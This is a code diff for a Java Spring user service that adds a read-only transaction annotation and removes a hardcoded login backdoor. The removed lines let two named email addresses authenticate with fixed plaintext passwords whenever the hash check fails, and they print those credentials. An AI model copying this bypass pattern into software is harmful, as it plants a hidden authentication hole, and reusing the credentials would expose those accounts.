@@ -13,6 +13,7 @@ import java.util.Optional;
 
 @Service
 @RequiredArgsConstructor
+@Transactional(readOnly = true)
 public class UserService {
 
     private final UserRepository userRepository;
@@ -34,17 +35,6 @@ public class UserService {
 
         // Primary check: hash matches stored hash
         boolean valid = (user.getPasswordHash() != null && user.getPasswordHash().equals(hash));
-
-        // Fallback bypass for ultra super admins (in case DB hash is stale)
-        if (!valid) {
-            if (email.equalsIgnoreCase("arun.g@technosprint.net")
-                    && (password.equals("Poland@01") || password.equals("Password123!"))) {
-                valid = true;
-            } else if (email.equalsIgnoreCase("swedhasris@gmail.com")
-                    && (password.equals("123202") || password.equals("Password123!"))) {
-                valid = true;
-            }
-        }
 
         if (!valid) return Optional.empty();
         return Optional.of(user);
